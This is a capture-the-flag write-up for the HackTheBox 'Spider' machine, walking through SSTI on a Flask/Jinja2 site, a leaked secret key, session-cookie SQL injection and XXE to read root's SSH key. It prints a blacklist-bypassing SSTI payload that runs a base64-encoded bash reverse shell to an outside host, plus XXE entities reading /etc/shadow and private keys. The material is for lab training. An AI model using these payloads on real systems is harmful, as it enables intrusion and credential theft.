# HackTheBox-Spider

## NMAP

```bash
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                    
| ssh-hostkey:                                                            
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZKP7Ebfve8CuM7AUHwkj38Y/0Pw04ub27AePqlhmH8FpgdDCkj3WINW8Yer3nmxZdh7zNadl6FZXYfmRRl/K3BC33Or44id3e8Uo87hMKP9
F5Nv85W7LfaoJhsHdwKL+u3h494N1Cv0n2ujJ2/KCYLQRZwvn1XfS4crkTVmNyrw3xtCYq0aCHNYxp51/WhNRULDf0MUMnA78M/1K9+erVCg4tOVMBisu2SD7SHN//E2IwSfHJTHfyDj+/zi6BbK
zW+4rIxxJr2GRNDaPlYXsm3/up5M+t7lMIYwHOTIRLu3trpx4lfWfIKea9uTNiahCARy3agSmx7f1WLp5NuLeH
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLxMnAdIHruSk1hB7McjxnudQ7f6I5sKPh1NpJd3Tmb9tedtLNqqPXtzroCP8caSRkfXjtJ/hp
+CiobuuYW8+fU=                       
|   256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJq0AuboJ6i4Hv3fUwQku//NLipnLhz1PfrV5KZ89eT
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)                 
| http-methods:                      
|_  Supported Methods: GET HEAD POST OPTIONS                              
|_http-server-header: nginx/1.14.0 (Ubuntu)                               
|_http-title: Did not follow redirect to http://spider.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   

```

From the nmap scan we can there are only 2 ports ,http (80) and ssh (22) also the web page will redirect us to `spider.htb` so we need to add this in our `/etc/hosts`  file

<img src="https://i.imgur.com/w5qtnhn.png"/>

## PORT 80 (HTTP)

<img src="https://i.imgur.com/RWxLYV0.png"/>

We can these pages which are interesting to us

<img src="https://i.imgur.com/BrZSJZ6.png"/>

The login requires a UserID so we can't just go and guess usernames

<img src="https://i.imgur.com/mfoWfnw.png"/>

So let's try to register an account

<img src="https://i.imgur.com/7i1cJb0.png"/>

<img src="https://i.imgur.com/mXa7CTc.png"/>

<img src="https://i.imgur.com/fxBUbKe.png"/>

We get a UUID after registerig an account , so we can login

<img src="https://i.imgur.com/mIIXqN2.png"/>

But we don't see much that we can do something here  , I ran `gobuster` but found nothing much interesting files or directories

<img src="https://i.imgur.com/5kipJWA.png"/>

<img src="https://i.imgur.com/1hdkoAV.png"/>

Seeing the cookies using developer tools we see a JWT token

<img src="https://i.imgur.com/dYWKbRm.png"/>

<img src="https://i.imgur.com/sMxKwDR.png"/>

But this is giving us an error maybe there's something missing JWT or something isn't included properly. I looked into different hackerone reports if there's something that can be done with UUID's being in JWT but all I found was that we can guess UUID but it's a long and tiring process so I did backed out of looking into UUID, I tried testing for Server Side Template Injection (SSTI) , which arises when an application is using a template to render something on the web page for example they will be using a template to display the username by taking the input value into the the template , there are many template engines like ruby template , twig (PHP) , jinja2 (Python) .


This web page is using `jinja2` and the way we can determine is by creating an account with the user name `{{7*'7'}}` which would result to 7777777 else it would result to 49 which would mean that it's using `twig`


<img src="https://i.imgur.com/rYmRkVo.png"/>

<img src="https://i.imgur.com/AIug9Xi.png"/>

I though of doing remote code execution which is possible through `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}` , since the character limit for usernmae is only 10 so we can't do it , instead I created a username with `{{config}}` which reveals us some juicy stuff

<img src="https://i.imgur.com/N6WmuB6.png"/>

```
<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'RATELIMIT_ENABLED': True, 'RATELIMIT_DEFAULTS_PER_METHOD': False, 'RATELIMIT_SWALLOW_ERRORS': False, 'RATELIMIT_HEADERS_ENABLED': False, 'RATELIMIT_STORAGE_URL': 'memory://', 'RATELIMIT_STRATEGY': 'fixed-window', 'RATELIMIT_HEADER_RESET': 'X-RateLimit-Reset', 'RATELIMIT_HEADER_REMAINING': 'X-RateLimit-Remaining', 'RATELIMIT_HEADER_LIMIT': 'X-RateLimit-Limit', 'RATELIMIT_HEADER_RETRY_AFTER': 'Retry-After', 'UPLOAD_FOLDER': 'static/uploads'}>
```

So I was wrong in assuming the cookie to be JWT , it's actually a flask cookie , which we can decode using `flask-unsign`  

<img src="https://i.imgur.com/Kg9u2g1.png"/>

Also we can do SQL Injection through flask session as well

<img src="https://i.imgur.com/mOW1D1d.png"/>

<img src="https://i.imgur.com/KIDpAfO.png"/>

<img src="https://i.imgur.com/ZD8wuHX.png"/>

We can try logging in with the UUID and password of `chiv` user

<img src="https://i.imgur.com/RH4GGU7.png"/>

Navigating to `View Messagaes` we can see that it's telling to fix the Support Portal, now here if we try to SSTI since the message that we input gets displayed on Support Portal with the message and email , let's try to see which input field is injectable

<img src="https://i.imgur.com/XOQzsUu.png"/>

It accepts our input so let's go to the view support mesages

<img src="https://i.imgur.com/FlNHNnn.png"/>

It doesn't display the result of `{{config}]` so let's try this on `email` input field

<img src="https://i.imgur.com/wt5dH6Z.png"/>

And if we get the message that `{{}}` these are blocked so this was a really frustrating process and it took me days to figure out how to bypass the blacklist , I came across some resources about bypassing the blacklist for SSTI . after a lot of trial and error I understood which words are blocked

```
if , ', . , __ , {{ , }} , set

```

Pretty much these were blacklisted so we can use `{% %}` which are used for statements  and for using `__import__` we can replace `__` with `\x5f\x5f` which is a hexadecimal conversion , we can use `request` to query the information , the final payload will look like this

```
{% print request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDMvMjIyMiAwPiYxCg== |base64 -d|bash")["read"]() %}

```

Since `if` ,`for` was blacklisted we used `print` keyword and the base64 encoded bash reverse shell because `.` was blacklisted 

<img src="https://i.imgur.com/U3n8TxL.png"/>

<img src="https://i.imgur.com/cP78XST.png"/>

We can now stabilize the reverse shell with `python3`

<img src="https://i.imgur.com/z5RNfhs.png"/>

Going into `chiv`'s  home directory we can get the user flag

<img src="https://i.imgur.com/ZvzODvk.png"/>

Since `id_rsa` key exists in `.ssh` folder we can grab that private key so we can login through ssh to get a better shell

<img src="https://i.imgur.com/WTyBimH.png"/>

<img src="https://i.imgur.com/DP4u8ot.png"/>

It's always a good idea to check the source code of the web application , so navigating to `/var/www/webapp`

<img src="https://i.imgur.com/80VQ3DI.png"/>

Checking `app.py` we can see the blacklist also some credentials as well

<img src="https://i.imgur.com/sWaoQGA.png"/>

It's a good idea to see which ports are locally open on the box , so using `ss -tulpn` which is socket status `ss` where `tulpn` shows tcp , udp , listening , process and port number , but process ID can't be shown as only root user can do that.

<img src="https://i.imgur.com/AOdtiHB.png"/>

So we have to do port forwarding and we can do ssh local port forwarding since we have access through ssh

<img src="https://i.imgur.com/P5mDrsx.png"/>

Here I have mapped port 8080 from target machine to my port 80 so the traffic from port 8080 will be transfered to my port 80 through ssh

<img src="https://i.imgur.com/7Luz2Ql.png"/>

Again we got a login page , but we can login with any name , and that name will be included in the flask session cookie , on decoding the cookie with `flask-unsign` we can see that there's a base64 encoded string which reveals to be in a xml format 

<img src="https://i.imgur.com/Ji6dJgw.png"/>

<img src="https://i.imgur.com/RmQ459Q.png"/>

This session has another base64 encoded text as mentioned earlier if we decode this we'll get something to be in a XML format

<img src="https://i.imgur.com/YVkKvdW.png"/>


Coming back to  the source code of html we can see another parameter `version` whose value is 1.0.0 , so let's try to add something and decode the cookie to see if something gets included

  <img src="https://i.imgur.com/f5DGPp1.png"/>
  
  So the value from here gets included in the comments so we need to comment something before including anything and then addding a starting tag for comment so after wards it gets commented like this 

`--> something <!--`

This would result to 

```xml
<!-- API Version 1.0.0 -->something <!-- -->
<root>
    <data>
        <username>arz</username>
        <is_admin>0</is_admin>
    </data>
</root>
```

Let's test this out 

<img src="https://i.imgur.com/eY2qLx7.png"/>

<img src="https://i.imgur.com/1DRbNhR.png"/>

It does , so this looks like XXE (XML External Entity) attack ,we can try to add DTD and create an etity to retrieve `/etc/passwd` , adding `<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` into the `version` parameter and we can use `username` paramter to call the entity since it gets included in username tag on xml also to url encode the DTD 

<img src="https://i.imgur.com/X8fdcNf.png"/>

Also we need to url encode `&xxe;` which is for calling the entity in the username tag

<img src="https://i.imgur.com/YbZKvSd.png"/>

<img src="https://i.imgur.com/ZP1DwYi.png"/>

Now if we decode the XML from the cookie 

<img src="https://i.imgur.com/cbxau2n.png"/>

We can see that it does work , all is left to see if XXE works if we submit this cookie in the browser

<img src="https://i.imgur.com/564X0kK.png"/>

Now we don't know if we are the root user or not , so let's try to grab `/etc/shadow` if we can then we are root

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
```

<img src="https://i.imgur.com/owYiMSk.png"/>

We can so all is left to grab the ssh key for root user , if it does exists

<img src="https://i.imgur.com/LBV9r9D.png"/>

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> ]>
```

<img src="https://i.imgur.com/DTJRyb9.png"/>

<img src="https://i.imgur.com/PktGw1F.png"/>


## References

- https://portswigger.net/web-security/server-side-template-injection
- https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#eval
- https://chowdera.com/2020/12/20201221231521371q.html
- https://www.fatalerrors.org/a/0dhx1Dk.html
- https://hackmd.io/@Chivato/HyWsJ31dI
